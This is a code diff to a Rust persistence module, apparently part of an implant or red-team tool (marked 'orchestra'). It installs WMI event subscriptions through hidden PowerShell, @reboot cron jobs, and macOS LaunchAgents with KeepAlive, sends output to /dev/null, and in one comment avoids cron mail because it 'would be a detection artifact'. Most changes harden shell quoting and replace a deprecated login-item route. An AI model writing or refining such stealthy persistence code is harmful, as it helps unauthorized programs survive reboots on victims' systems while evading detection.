@@ -9,6 +9,11 @@ pub trait Persist {
     fn verify(&self) -> Result<bool>;
 }
 
+#[cfg(any(target_os = "macos", target_os = "linux"))]
+fn shell_quote_single(s: &str) -> String {
+    format!("'{}'", s.replace('\'', "'\\''"))
+}
+
 // ──────────────────────────────────────────────────────────────────────────────
 // Windows persistence implementations
 // ──────────────────────────────────────────────────────────────────────────────
@@ -168,6 +173,13 @@ pub mod windows {
         }
     }
 
+    // Escape a value for embedding inside a single-quoted PowerShell string.
+    // In PowerShell single-quoted strings, only a single quote itself must be
+    // escaped, and it is escaped by doubling it.
+    fn escape_ps_string(s: &str) -> String {
+        s.replace('\'', "''")
+    }
+
     impl Persist for WmiSubscription {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
             // WMI persistence via __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding
@@ -178,6 +190,8 @@ pub mod windows {
             use winapi::um::objbase::COINIT_MULTITHREADED;
 
             let exe_path = executable_path.to_string_lossy();
+            let escaped_subscription_name = escape_ps_string(&self.subscription_name);
+            let escaped_exe_path = escape_ps_string(exe_path.as_ref());
             log::info!(
                 "WmiSubscription::install: registering '{}' for '{}'",
                 self.subscription_name,
@@ -206,7 +220,10 @@ pub mod windows {
                     $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{{Name='{}';CommandLineTemplate='{}'}};
                     Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{{Filter=$filter;Consumer=$consumer}}"
                 "#,
-                    self.subscription_name, filter_query, self.subscription_name, exe_path
+                    escaped_subscription_name,
+                    filter_query,
+                    escaped_subscription_name,
+                    escaped_exe_path
                 );
 
                 let status = std::process::Command::new("cmd")
@@ -228,13 +245,14 @@ pub mod windows {
         }
 
         fn remove(&self) -> Result<()> {
+            let escaped_subscription_name = escape_ps_string(&self.subscription_name);
             let ps_cmd = format!(
                 r#"powershell -NonInteractive -WindowStyle Hidden -Command "
                 Get-WmiObject __EventFilter -Namespace root\subscription | Where-Object {{$_.Name -eq '{0}'}} | Remove-WmiObject;
                 Get-WmiObject CommandLineEventConsumer -Namespace root\subscription | Where-Object {{$_.Name -eq '{0}'}} | Remove-WmiObject;
                 Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {{$_.Filter -like '*{0}*'}} | Remove-WmiObject"
             "#,
-                self.subscription_name
+                escaped_subscription_name
             );
             let _ = std::process::Command::new("cmd")
                 .args(["/C", &ps_cmd])
@@ -247,9 +265,10 @@ pub mod windows {
         }
 
         fn verify(&self) -> Result<bool> {
+            let escaped_subscription_name = escape_ps_string(&self.subscription_name);
             let ps_cmd = format!(
                 "powershell -NonInteractive -Command \"(Get-WmiObject __EventFilter -Namespace root\\subscription | Where-Object {{$_.Name -eq '{}'}}) -ne $null\""
-            , self.subscription_name);
+            , escaped_subscription_name);
             let out = std::process::Command::new("cmd")
                 .args(["/C", &ps_cmd])
                 .output()
@@ -463,7 +482,7 @@ pub mod windows {
 pub use macos::*;
 #[cfg(target_os = "macos")]
 pub mod macos {
-    use super::Persist;
+    use super::{Persist, shell_quote_single};
     use anyhow::{anyhow, Result};
     use std::path::PathBuf;
 
@@ -596,17 +615,18 @@ pub mod macos {
     impl Persist for CronJob {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
             let exe = executable_path.to_string_lossy();
-            let escaped_exe = exe.replace("'", "'\\''");
+            let quoted_exe = shell_quote_single(exe.as_ref());
+            let quoted_marker = shell_quote_single(MAC_CRON_MARKER);
             let entry = format!(
-                "@reboot '{}' >/dev/null 2>&1 {}",
-                escaped_exe, MAC_CRON_MARKER
+                "@reboot {} >/dev/null 2>&1 {}",
+                quoted_exe, MAC_CRON_MARKER
             );
-            let escaped_entry = entry.replace("'", "'\\''");
+            let quoted_entry = shell_quote_single(&entry);
             let out = std::process::Command::new("sh")
                 .arg("-c")
                 .arg(format!(
-                    "(crontab -l 2>/dev/null | grep -v '{}'; echo '{}') | crontab -",
-                    MAC_CRON_MARKER, escaped_entry
+                    "(crontab -l 2>/dev/null | grep -v {}; echo {}) | crontab -",
+                    quoted_marker, quoted_entry
                 ))
                 .status()
                 .map_err(|e| anyhow!("CronJob::install: {}", e))?;
@@ -618,11 +638,12 @@ pub mod macos {
         }
 
         fn remove(&self) -> Result<()> {
+            let quoted_marker = shell_quote_single(MAC_CRON_MARKER);
             let _ = std::process::Command::new("sh")
                 .arg("-c")
                 .arg(format!(
-                    "crontab -l 2>/dev/null | grep -v '{}' | crontab -",
-                    MAC_CRON_MARKER
+                    "crontab -l 2>/dev/null | grep -v {} | crontab -",
+                    quoted_marker
                 ))
                 .status();
             log::info!("CronJob::remove: removed orchestra @reboot entry");
@@ -770,7 +791,7 @@ pub mod macos {
 
     // ── 5.1: LoginItems ───────────────────────────────────────────────────────
 
-    /// LoginItems persistence via osascript (user session, no root needed).
+    /// LoginItems persistence via a GUI-session LaunchAgent bootstrap.
     pub struct LoginItem {
         pub app_name: String,
     }
@@ -783,39 +804,159 @@ pub mod macos {
         }
     }
 
+    impl LoginItem {
+        fn label(&self) -> String {
+            format!(
+                "com.{}.helper",
+                self.app_name.to_ascii_lowercase().replace(' ', "-")
+            )
+        }
+
+        fn plist_path(&self) -> Result<PathBuf> {
+            let home = dirs::home_dir().ok_or_else(|| anyhow!("LoginItem: no home dir"))?;
+            Ok(home
+                .join("Library/LaunchAgents")
+                .join(format!("{}.plist", self.label())))
+        }
+    }
+
     impl Persist for LoginItem {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
-            // The System Events "make login item" API was deprecated in
-            // macOS 10.11 and is non-functional on macOS 12+.  Delegate to
-            // LaunchAgent which uses launchctl and is the modern supported
-            // mechanism for login-time persistence (H-16 fix).
-            let la = LaunchAgent {
-                label: format!(
-                    "com.{}.helper",
-                    self.app_name.to_ascii_lowercase().replace(' ', "-")
-                ),
-            };
-            la.install(executable_path)
+            let label = self.label();
+            let plist = format!(
+                r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>{label}</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>StandardOutPath</key>
+    <string>/dev/null</string>
+    <key>StandardErrorPath</key>
+    <string>/dev/null</string>
+</dict>
+</plist>"#,
+                label = label,
+                exe = executable_path.display()
+            );
+
+            let plist_path = self.plist_path()?;
+            let agents_dir = plist_path
+                .parent()
+                .ok_or_else(|| anyhow!("LoginItem::install: invalid plist path"))?;
+            std::fs::create_dir_all(agents_dir)
+                .map_err(|e| anyhow!("LoginItem::install: mkdir failed: {}", e))?;
+            std::fs::write(&plist_path, plist)
+                .map_err(|e| anyhow!("LoginItem::install: write failed: {}", e))?;
+
+            // SMLoginItemSetEnabled requires an app bundle helper in
+            // Contents/Library/LoginItems. For a standalone binary, use a
+            // user LaunchAgent and explicitly bootstrap it in the GUI session
+            // via `launchctl asuser`.
+            let uid = unsafe { libc::getuid() };
+            let uid_str = uid.to_string();
+            let gui_domain = format!("gui/{uid}");
+
+            // Best effort: remove any stale loaded instance so bootstrap does
+            // not fail due to an existing job.
+            let _ = std::process::Command::new("launchctl")
+                .arg("asuser")
+                .arg(&uid_str)
+                .arg("launchctl")
+                .arg("bootout")
+                .arg(&gui_domain)
+                .arg(&plist_path)
+                .status();
+
+            let bootstrap = std::process::Command::new("launchctl")
+                .arg("asuser")
+                .arg(&uid_str)
+                .arg("launchctl")
+                .arg("bootstrap")
+                .arg(&gui_domain)
+                .arg(&plist_path)
+                .output()
+                .map_err(|e| anyhow!("LoginItem::install: launchctl asuser bootstrap: {}", e))?;
+            if !bootstrap.status.success() {
+                let stderr = String::from_utf8_lossy(&bootstrap.stderr).trim().to_string();
+                let detail = if stderr.is_empty() {
+                    "no stderr output".to_string()
+                } else {
+                    stderr
+                };
+                return Err(anyhow!(
+                    "LoginItem::install: failed to bootstrap '{}' into {} via launchctl asuser: {}",
+                    plist_path.display(),
+                    gui_domain,
+                    detail
+                ));
+            }
+
+            log::info!(
+                "LoginItem::install: bootstrapped '{}' in {} via launchctl asuser",
+                plist_path.display(),
+                gui_domain
+            );
+            Ok(())
         }
 
         fn remove(&self) -> Result<()> {
-            let la = LaunchAgent {
-                label: format!(
-                    "com.{}.helper",
-                    self.app_name.to_ascii_lowercase().replace(' ', "-")
-                ),
+            let plist_path = match self.plist_path() {
+                Ok(p) => p,
+                Err(_) => return Ok(()),
             };
-            la.remove()
+
+            let uid = unsafe { libc::getuid() };
+            let uid_str = uid.to_string();
+            let gui_domain = format!("gui/{uid}");
+
+            let _ = std::process::Command::new("launchctl")
+                .arg("asuser")
+                .arg(&uid_str)
+                .arg("launchctl")
+                .arg("bootout")
+                .arg(&gui_domain)
+                .arg(&plist_path)
+                .status();
+            let _ = std::fs::remove_file(&plist_path);
+
+            log::info!(
+                "LoginItem::remove: removed '{}' from {}",
+                self.label(),
+                gui_domain
+            );
+            Ok(())
         }
 
         fn verify(&self) -> Result<bool> {
-            let la = LaunchAgent {
-                label: format!(
-                    "com.{}.helper",
-                    self.app_name.to_ascii_lowercase().replace(' ', "-")
-                ),
+            let plist_path = match self.plist_path() {
+                Ok(p) => p,
+                Err(_) => return Ok(false),
             };
-            la.verify()
+            if !plist_path.exists() {
+                return Ok(false);
+            }
+
+            let uid = unsafe { libc::getuid() };
+            let service = format!("gui/{}/{}", uid, self.label());
+            let status = std::process::Command::new("launchctl")
+                .arg("asuser")
+                .arg(uid.to_string())
+                .arg("launchctl")
+                .arg("print")
+                .arg(&service)
+                .status()
+                .map_err(|e| anyhow!("LoginItem::verify: launchctl asuser print: {}", e))?;
+
+            Ok(status.success())
         }
     }
 }
@@ -827,7 +968,7 @@ pub mod macos {
 pub use linux::*;
 #[cfg(target_os = "linux")]
 pub mod linux {
-    use super::Persist;
+    use super::{Persist, shell_quote_single};
     use anyhow::{anyhow, Result};
     use std::io::Write;
     use std::path::PathBuf;
@@ -917,16 +1058,17 @@ pub mod linux {
     impl Persist for CronJob {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
             let exe = executable_path.to_string_lossy();
-            let escaped_exe = exe.replace("'", "'\\''");
+            let quoted_exe = shell_quote_single(exe.as_ref());
+            let quoted_marker = shell_quote_single(CRON_MARKER);
             // Redirect both stdout and stderr to /dev/null so cron does not
             // attempt to mail the output to the user (which would be a detection artifact).
-            let entry = format!("@reboot '{}' >/dev/null 2>&1 {}", escaped_exe, CRON_MARKER);
-            let escaped_entry = entry.replace("'", "'\\''");
+            let entry = format!("@reboot {} >/dev/null 2>&1 {}", quoted_exe, CRON_MARKER);
+            let quoted_entry = shell_quote_single(&entry);
             let out = std::process::Command::new("sh")
                 .arg("-c")
                 .arg(format!(
-                    "(crontab -l 2>/dev/null | grep -v '{}'; echo '{}') | crontab -",
-                    CRON_MARKER, escaped_entry
+                    "(crontab -l 2>/dev/null | grep -v {}; echo {}) | crontab -",
+                    quoted_marker, quoted_entry
                 ))
                 .status()
                 .map_err(|e| anyhow!("CronJob::install: {}", e))?;
@@ -938,11 +1080,12 @@ pub mod linux {
         }
 
         fn remove(&self) -> Result<()> {
+            let quoted_marker = shell_quote_single(CRON_MARKER);
             let _ = std::process::Command::new("sh")
                 .arg("-c")
                 .arg(format!(
-                    "crontab -l 2>/dev/null | grep -v '{}' | crontab -",
-                    CRON_MARKER
+                    "crontab -l 2>/dev/null | grep -v {} | crontab -",
+                    quoted_marker
                 ))
                 .status()
                 .map_err(|e| anyhow!("CronJob::remove: {}", e))?;
